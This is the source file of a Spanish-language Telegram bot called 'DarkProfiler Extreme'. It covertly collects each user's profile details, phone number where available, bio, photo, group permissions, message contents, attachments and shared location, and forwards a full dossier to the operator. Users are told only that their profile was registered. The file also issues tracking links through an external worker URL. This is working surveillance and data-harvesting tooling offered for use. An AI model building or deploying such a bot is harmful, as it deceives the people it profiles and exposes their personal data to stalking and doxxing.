import os
import logging
import aiohttp
import secrets
import json
import hashlib
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
WORKER_URL = "https://orange-queen-694e.societykark.workers.dev/"  # Cambia por tu Worker

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

users_db = {}
tracking_codes = {}

# ========== MENÚ ==========
def menu_principal():
    keyboard = [
        [InlineKeyboardButton("📊 Mi perfil", callback_data="perfil")],
        [InlineKeyboardButton("🔗 Generar enlace", callback_data="tracking")],
        [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
        [InlineKeyboardButton("⚙️ Configuración", callback_data="config")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== EXTRACCIÓN TOTAL (80+ CAMPOS) ==========
async def get_user_full_info(bot, user, chat=None, message=None):
    info = {}
    
    # ===== 1. DATOS BÁSICOS DE TELEGRAM (15 campos) =====
    info["id"] = user.id
    info["first_name"] = user.first_name or "N/A"
    info["last_name"] = user.last_name or "N/A"
    info["full_name"] = f"{info['first_name']} {info['last_name']}".strip()
    info["full_name_reverse"] = f"{info['last_name']} {info['first_name']}".strip()
    info["username"] = user.username or "N/A"
    info["username_url"] = f"https://t.me/{user.username}" if user.username else "N/A"
    info["language"] = user.language_code or "N/A"
    info["is_bot"] = user.is_bot
    info["is_premium"] = getattr(user, 'is_premium', False)
    info["user_created"] = getattr(user, 'created_at', "N/A")  # No disponible en la API estándar
    info["last_online"] = getattr(user, 'last_online', "N/A")  # No disponible en la API estándar
    info["is_verified"] = getattr(user, 'is_verified', False)  # No disponible en la API estándar
    info["is_scam"] = getattr(user, 'is_scam', False)  # No disponible en la API estándar
    info["is_fake"] = getattr(user, 'is_fake', False)  # No disponible en la API estándar
    
    # ===== 2. NÚMERO DE TELÉFONO (si es público) =====
    try:
        full_chat = await bot.get_chat(user.id)
        info["phone_number"] = full_chat.phone_number if hasattr(full_chat, 'phone_number') else "No disponible"
        info["phone_verified"] = getattr(full_chat, 'phone_verified', False)
    except:
        info["phone_number"] = "No disponible"
        info["phone_verified"] = False
    
    # ===== 3. BIOGRAFÍA Y DESCRIPCIÓN =====
    try:
        chat_full = await bot.get_chat(user.id)
        info["bio"] = chat_full.bio if hasattr(chat_full, 'bio') else "No disponible"
        info["description"] = chat_full.description if hasattr(chat_full, 'description') else "No disponible"
    except:
        info["bio"] = "No disponible"
        info["description"] = "No disponible"
    
    # ===== 4. FOTO DE PERFIL (detalles completos) =====
    try:
        photos = await bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            photo_obj = photos.photos[0][-1]
            info["photo_id"] = photo_obj.file_id
            info["photo_unique_id"] = photo_obj.file_unique_id
            info["photo_width"] = photo_obj.width
            info["photo_height"] = photo_obj.height
            info["photo_file_size"] = photo_obj.file_size
            info["photo_count"] = photos.total_count
        else:
            info["photo_id"] = None
            info["photo_unique_id"] = None
            info["photo_width"] = 0
            info["photo_height"] = 0
            info["photo_file_size"] = 0
            info["photo_count"] = 0
    except:
        info["photo_id"] = None
        info["photo_unique_id"] = None
        info["photo_width"] = 0
        info["photo_height"] = 0
        info["photo_file_size"] = 0
        info["photo_count"] = 0
    
    # ===== 5. CHAT ACTUAL (detalles completos) =====
    if chat:
        info["chat_type"] = chat.type
        info["chat_id"] = chat.id
        info["chat_title"] = chat.title if hasattr(chat, 'title') else "Privado"
        info["chat_members"] = getattr(chat, 'member_count', 1)
        info["chat_description"] = getattr(chat, 'description', "N/A")
        info["chat_invite_link"] = getattr(chat, 'invite_link', "N/A")
        info["chat_permissions"] = str(getattr(chat, 'permissions', "N/A"))
        info["chat_slow_mode"] = getattr(chat, 'slow_mode_delay', 0)
        info["chat_message_ttl"] = getattr(chat, 'message_ttl', 0)
    else:
        info["chat_type"] = "N/A"
        info["chat_id"] = "N/A"
        info["chat_title"] = "N/A"
        info["chat_members"] = 0
        info["chat_description"] = "N/A"
        info["chat_invite_link"] = "N/A"
        info["chat_permissions"] = "N/A"
        info["chat_slow_mode"] = 0
        info["chat_message_ttl"] = 0
    
    # ===== 6. PERMISOS EN GRUPO (10+ campos) =====
    if chat and chat.type in ["group", "supergroup"]:
        try:
            member = await bot.get_chat_member(chat.id, user.id)
            info["is_admin"] = member.status in ["administrator", "creator"]
            info["is_creator"] = member.status == "creator"
            info["member_status"] = member.status
            info["can_be_edited"] = getattr(member, 'can_be_edited', False)
            info["can_change_info"] = getattr(member, 'can_change_info', False)
            info["can_post_messages"] = getattr(member, 'can_post_messages', False)
            info["can_edit_messages"] = getattr(member, 'can_edit_messages', False)
            info["can_delete_messages"] = getattr(member, 'can_delete_messages', False)
            info["can_invite_users"] = getattr(member, 'can_invite_users', False)
            info["can_restrict_members"] = getattr(member, 'can_restrict_members', False)
            info["can_pin_messages"] = getattr(member, 'can_pin_messages', False)
            info["can_promote_members"] = getattr(member, 'can_promote_members', False)
            info["can_send_messages"] = getattr(member, 'can_send_messages', True)
            info["can_send_media_messages"] = getattr(member, 'can_send_media_messages', True)
            info["can_send_polls"] = getattr(member, 'can_send_polls', True)
            info["can_send_other_messages"] = getattr(member, 'can_send_other_messages', True)
            info["can_add_web_page_previews"] = getattr(member, 'can_add_web_page_previews', True)
            info["can_manage_chat"] = getattr(member, 'can_manage_chat', False)
            info["can_manage_voice_chats"] = getattr(member, 'can_manage_voice_chats', False)
        except:
            info["is_admin"] = False
            info["is_creator"] = False
            info["member_status"] = "N/A"
            info["can_be_edited"] = False
            info["can_change_info"] = False
            info["can_post_messages"] = False
            info["can_edit_messages"] = False
            info["can_delete_messages"] = False
            info["can_invite_users"] = False
            info["can_restrict_members"] = False
            info["can_pin_messages"] = False
            info["can_promote_members"] = False
            info["can_send_messages"] = True
            info["can_send_media_messages"] = True
            info["can_send_polls"] = True
            info["can_send_other_messages"] = True
            info["can_add_web_page_previews"] = True
            info["can_manage_chat"] = False
            info["can_manage_voice_chats"] = False
    else:
        info["is_admin"] = False
        info["is_creator"] = False
        info["member_status"] = "N/A"
        info["can_be_edited"] = False
        info["can_change_info"] = False
        info["can_post_messages"] = False
        info["can_edit_messages"] = False
        info["can_delete_messages"] = False
        info["can_invite_users"] = False
        info["can_restrict_members"] = False
        info["can_pin_messages"] = False
        info["can_promote_members"] = False
        info["can_send_messages"] = True
        info["can_send_media_messages"] = True
        info["can_send_polls"] = True
        info["can_send_other_messages"] = True
        info["can_add_web_page_previews"] = True
        info["can_manage_chat"] = False
        info["can_manage_voice_chats"] = False
    
    # ===== 7. MENSAJE (detalles completos) =====
    if message:
        info["message_id"] = message.message_id
        info["message_date"] = message.date.isoformat()
        info["message_date_unix"] = message.date.timestamp()
        info["message_text"] = message.text[:500] + ("..." if len(message.text) > 500 else "") if message.text else "N/A"
        info["message_text_full"] = message.text if message.text else "N/A"
        info["message_text_hash"] = hashlib.md5(str(message.text).encode()).hexdigest() if message.text else "N/A"
        
        # 7a. Foto en mensaje
        if hasattr(message, 'photo') and message.photo:
            photo = message.photo[-1]
            info["has_photo"] = True
            info["photo_caption"] = message.caption or "Sin caption"
            info["photo_width_msg"] = photo.width
            info["photo_height_msg"] = photo.height
            info["photo_file_id_msg"] = photo.file_id
            info["photo_file_size_msg"] = photo.file_size
            info["photo_unique_id_msg"] = photo.file_unique_id
        else:
            info["has_photo"] = False
            info["photo_caption"] = "N/A"
            info["photo_width_msg"] = 0
            info["photo_height_msg"] = 0
            info["photo_file_id_msg"] = "N/A"
            info["photo_file_size_msg"] = 0
            info["photo_unique_id_msg"] = "N/A"
        
        # 7b. Documento en mensaje
        if hasattr(message, 'document') and message.document:
            doc = message.document
            info["has_document"] = True
            info["document_name"] = doc.file_name
            info["document_mime"] = doc.mime_type
            info["document_size"] = doc.file_size
            info["document_id"] = doc.file_id
        else:
            info["has_document"] = False
            info["document_name"] = "N/A"
            info["document_mime"] = "N/A"
            info["document_size"] = 0
            info["document_id"] = "N/A"
        
        # 7c. Video en mensaje
        if hasattr(message, 'video') and message.video:
            vid = message.video
            info["has_video"] = True
            info["video_duration"] = vid.duration
            info["video_width"] = vid.width
            info["video_height"] = vid.height
            info["video_size"] = vid.file_size
            info["video_id"] = vid.file_id
        else:
            info["has_video"] = False
            info["video_duration"] = 0
            info["video_width"] = 0
            info["video_height"] = 0
            info["video_size"] = 0
            info["video_id"] = "N/A"
        
        # 7d. Sticker en mensaje
        if hasattr(message, 'sticker') and message.sticker:
            stick = message.sticker
            info["has_sticker"] = True
            info["sticker_emoji"] = stick.emoji
            info["sticker_set_name"] = stick.set_name
            info["sticker_width"] = stick.width
            info["sticker_height"] = stick.height
            info["sticker_size"] = stick.file_size
            info["sticker_id"] = stick.file_id
            info["sticker_is_animated"] = stick.is_animated
            info["sticker_is_video"] = stick.is_video
        else:
            info["has_sticker"] = False
            info["sticker_emoji"] = "N/A"
            info["sticker_set_name"] = "N/A"
            info["sticker_width"] = 0
            info["sticker_height"] = 0
            info["sticker_size"] = 0
            info["sticker_id"] = "N/A"
            info["sticker_is_animated"] = False
            info["sticker_is_video"] = False
        
        # 7e. Audio/Voz en mensaje
        if hasattr(message, 'audio') and message.audio:
            audio = message.audio
            info["has_audio"] = True
            info["audio_duration"] = audio.duration
            info["audio_size"] = audio.file_size
            info["audio_title"] = audio.title
            info["audio_performer"] = audio.performer
        else:
            info["has_audio"] = False
            info["audio_duration"] = 0
            info["audio_size"] = 0
            info["audio_title"] = "N/A"
            info["audio_performer"] = "N/A"
        
        # 7f. Ubicación en mensaje
        if hasattr(message, 'location') and message.location:
            loc = message.location
            info["has_location"] = True
            info["location_latitude"] = loc.latitude
            info["location_longitude"] = loc.longitude
            info["location_heading"] = loc.heading
        else:
            info["has_location"] = False
            info["location_latitude"] = 0.0
            info["location_longitude"] = 0.0
            info["location_heading"] = 0
    
    # ===== 8. CÓDIGO DE TRACKING =====
    info["tracking_code"] = secrets.token_urlsafe(12)
    
    return info

# ========== FORMATEAR PARA ADMIN (100+ líneas) ==========
def format_info_for_admin(info):
    msg = f"🕵️ *PERFIL COMPLETO EXTREME*\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    # Sección 1: Telegram (20 campos)
    msg += f"👤 *TELEGRAM*\n"
    msg += f"   • ID: `{info.get('id')}`\n"
    msg += f"   • Nombre completo: {info.get('full_name')}\n"
    msg += f"   • Nombre inverso: {info.get('full_name_reverse')}\n"
    msg += f"   • Primer nombre: {info.get('first_name')}\n"
    msg += f"   • Apellido: {info.get('last_name')}\n"
    msg += f"   • Username: @{info.get('username')}\n"
    msg += f"   • Enlace directo: {info.get('username_url')}\n"
    msg += f"   • Idioma: {info.get('language')}\n"
    msg += f"   • Es bot: {'Sí' if info.get('is_bot') else 'No'}\n"
    msg += f"   • Premium: {'Sí' if info.get('is_premium') else 'No'}\n"
    msg += f"   • Verificado: {'Sí' if info.get('is_verified') else 'No'}\n"
    msg += f"   • Scam: {'Sí' if info.get('is_scam') else 'No'}\n"
    msg += f"   • Falso: {'Sí' if info.get('is_fake') else 'No'}\n"
    msg += f"   • Teléfono: {info.get('phone_number')}\n"
    msg += f"   • Teléfono verificado: {'Sí' if info.get('phone_verified') else 'No'}\n"
    msg += f"   • Biografía: {info.get('bio')}\n"
    msg += f"   • Descripción: {info.get('description')}\n"
    msg += f"   • Creado: {info.get('user_created')}\n"
    msg += f"   • Último online: {info.get('last_online')}\n\n"
    
    # Sección 2: Foto de perfil (8 campos)
    msg += f"📸 *FOTO DE PERFIL*\n"
    msg += f"   • Cantidad: {info.get('photo_count', 0)}\n"
    msg += f"   • ID: `{info.get('photo_id', 'N/A')}`\n"
    msg += f"   • ID único: `{info.get('photo_unique_id', 'N/A')}`\n"
    msg += f"   • Ancho: {info.get('photo_width', 0)}px\n"
    msg += f"   • Alto: {info.get('photo_height', 0)}px\n"
    msg += f"   • Tamaño: {info.get('photo_file_size', 0)} bytes\n\n"
    
    # Sección 3: Chat actual (10 campos)
    msg += f"💬 *CHAT ACTUAL*\n"
    msg += f"   • Tipo: {info.get('chat_type', 'N/A')}\n"
    msg += f"   • ID: `{info.get('chat_id', 'N/A')}`\n"
    msg += f"   • Título: {info.get('chat_title', 'N/A')}\n"
    msg += f"   • Miembros: {info.get('chat_members', 'N/A')}\n"
    msg += f"   • Descripción: {info.get('chat_description', 'N/A')}\n"
    msg += f"   • Enlace invitación: {info.get('chat_invite_link', 'N/A')}\n"
    msg += f"   • Permisos: {info.get('chat_permissions', 'N/A')}\n"
    msg += f"   • Modo lento: {info.get('chat_slow_mode', 0)}s\n"
    msg += f"   • TTL mensajes: {info.get('chat_message_ttl', 0)}s\n\n"
    
    # Sección 4: Permisos (20 campos)
    msg += f"🔑 *PERMISOS EN GRUPO*\n"
    msg += f"   • Admin: {'Sí' if info.get('is_admin') else 'No'}\n"
    msg += f"   • Creador: {'Sí' if info.get('is_creator') else 'No'}\n"
    msg += f"   • Estado: {info.get('member_status', 'N/A')}\n"
    msg += f"   • Puede ser editado: {'Sí' if info.get('can_be_edited') else 'No'}\n"
    msg += f"   • Cambiar info: {'Sí' if info.get('can_change_info') else 'No'}\n"
    msg += f"   • Publicar mensajes: {'Sí' if info.get('can_post_messages') else 'No'}\n"
    msg += f"   • Editar mensajes: {'Sí' if info.get('can_edit_messages') else 'No'}\n"
    msg += f"   • Eliminar mensajes: {'Sí' if info.get('can_delete_messages') else 'No'}\n"
    msg += f"   • Invitar usuarios: {'Sí' if info.get('can_invite_users') else 'No'}\n"
    msg += f"   • Restringir miembros: {'Sí' if info.get('can_restrict_members') else 'No'}\n"
    msg += f"   • Fijar mensajes: {'Sí' if info.get('can_pin_messages') else 'No'}\n"
    msg += f"   • Promover miembros: {'Sí' if info.get('can_promote_members') else 'No'}\n"
    msg += f"   • Enviar mensajes: {'Sí' if info.get('can_send_messages') else 'No'}\n"
    msg += f"   • Enviar multimedia: {'Sí' if info.get('can_send_media_messages') else 'No'}\n"
    msg += f"   • Enviar encuestas: {'Sí' if info.get('can_send_polls') else 'No'}\n"
    msg += f"   • Enviar otros: {'Sí' if info.get('can_send_other_messages') else 'No'}\n"
    msg += f"   • Vista previa: {'Sí' if info.get('can_add_web_page_previews') else 'No'}\n"
    msg += f"   • Gestionar chat: {'Sí' if info.get('can_manage_chat') else 'No'}\n"
    msg += f"   • Gestionar voz: {'Sí' if info.get('can_manage_voice_chats') else 'No'}\n\n"
    
    # Sección 5: Mensaje (20 campos)
    if info.get('message_id'):
        msg += f"📩 *MENSAJE ENVIADO*\n"
        msg += f"   • ID: {info.get('message_id')}\n"
        msg += f"   • Fecha: {info.get('message_date')}\n"
        msg += f"   • Fecha (Unix): {info.get('message_date_unix')}\n"
        msg += f"   • Texto: {info.get('message_text')}\n"
        msg += f"   • Hash MD5: `{info.get('message_text_hash')}`\n\n"
        
        msg += f"📷 *FOTO (si aplica)*\n"
        msg += f"   • Tiene foto: {'Sí' if info.get('has_photo') else 'No'}\n"
        msg += f"   • Caption: {info.get('photo_caption', 'N/A')}\n"
        msg += f"   • Ancho: {info.get('photo_width_msg', 0)}px\n"
        msg += f"   • Alto: {info.get('photo_height_msg', 0)}px\n"
        msg += f"   • ID: `{info.get('photo_file_id_msg', 'N/A')}`\n\n"
        
        msg += f"📄 *DOCUMENTO (si aplica)*\n"
        msg += f"   • Tiene documento: {'Sí' if info.get('has_document') else 'No'}\n"
        msg += f"   • Nombre: {info.get('document_name', 'N/A')}\n"
        msg += f"   • MIME: {info.get('document_mime', 'N/A')}\n"
        msg += f"   • Tamaño: {info.get('document_size', 0)} bytes\n\n"
        
        msg += f"🎥 *VIDEO (si aplica)*\n"
        msg += f"   • Tiene video: {'Sí' if info.get('has_video') else 'No'}\n"
        msg += f"   • Duración: {info.get('video_duration', 0)}s\n"
        msg += f"   • Resolución: {info.get('video_width', 0)}x{info.get('video_height', 0)}\n"
        msg += f"   • Tamaño: {info.get('video_size', 0)} bytes\n\n"
        
        msg += f"🎨 *STICKER (si aplica)*\n"
        msg += f"   • Tiene sticker: {'Sí' if info.get('has_sticker') else 'No'}\n"
        msg += f"   • Emoji: {info.get('sticker_emoji', 'N/A')}\n"
        msg += f"   • Set: {info.get('sticker_set_name', 'N/A')}\n"
        msg += f"   • Animado: {'Sí' if info.get('sticker_is_animated') else 'No'}\n"
        msg += f"   • Video: {'Sí' if info.get('sticker_is_video') else 'No'}\n\n"
        
        msg += f"🎵 *AUDIO (si aplica)*\n"
        msg += f"   • Tiene audio: {'Sí' if info.get('has_audio') else 'No'}\n"
        msg += f"   • Duración: {info.get('audio_duration', 0)}s\n"
        msg += f"   • Título: {info.get('audio_title', 'N/A')}\n"
        msg += f"   • Artista: {info.get('audio_performer', 'N/A')}\n\n"
        
        msg += f"📍 *UBICACIÓN (si aplica)*\n"
        msg += f"   • Tiene ubicación: {'Sí' if info.get('has_location') else 'No'}\n"
        msg += f"   • Latitud: {info.get('location_latitude', 0.0)}\n"
        msg += f"   • Longitud: {info.get('location_longitude', 0.0)}\n"
        msg += f"   • Heading: {info.get('location_heading', 0)}\n\n"
    
    # Sección 6: Tracking
    msg += f"🔗 *TRACKING*\n"
    msg += f"   • Código: `{info.get('tracking_code')}`\n\n"
    
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    return msg

# ========== COMANDOS (simplificados) ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin.")
        return
    chat = update.effective_chat
    message = update.message
    info = await get_user_full_info(context.bot, user, chat, message)
    users_db[user.id] = info
    await context.bot.send_message(chat_id=ADMIN_ID, text=format_info_for_admin(info), parse_mode=ParseMode.MARKDOWN)
    if info.get("photo_id"):
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=info["photo_id"], caption=f"📸 Foto de {info['first_name']}")
    await update.message.reply_text("📊 *Perfil registrado*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = secrets.token_urlsafe(12)
    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
    link = f"{WORKER_URL}/track/{code}"
    if user.id in users_db:
        users_db[user.id]["tracking_code"] = code
    await update.message.reply_text(f"🔗 *Enlace:*\n`{link}`", parse_mode=ParseMode.MARKDOWN)
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 *Nuevo enlace*\nUsuario: {user.first_name}\nCódigo: `{code}`\nEnlace: {link}", parse_mode=ParseMode.MARKDOWN)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    await update.message.reply_text(f"📊 *Estadísticas*\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}", parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🕵️ *DarkProfiler Extreme*\nComandos: /start, /perfil, /tracking, /stats, /help", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    info = users_db.get(user.id)
    if not info:
        await update.message.reply_text("❌ Usa /start.")
        return
    msg = f"📊 *Tu perfil*\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 `{info.get('id')}`\n🗣️ {info.get('language')}\n⭐ {'Premium' if info.get('is_premium') else 'Normal'}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "perfil":
        await perfil(update, context)
        await query.delete_message()
    elif data == "tracking":
        await tracking(update, context)
        await query.delete_message()
    elif data == "stats":
        await stats(update, context)
        await query.delete_message()
    elif data == "config":
        await query.edit_message_text("⚙️ *Configuración*\n\nBot en modo extreme. Extrae todo.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

def main():
    Thread(target=run_http_server, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", perfil))
    app.add_handler(CommandHandler("tracking", tracking))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_error_handler(error_handler)
    logger.info("✅ DarkProfiler Extreme iniciado")
    app.run_polling()

if __name__ == "__main__":
    main()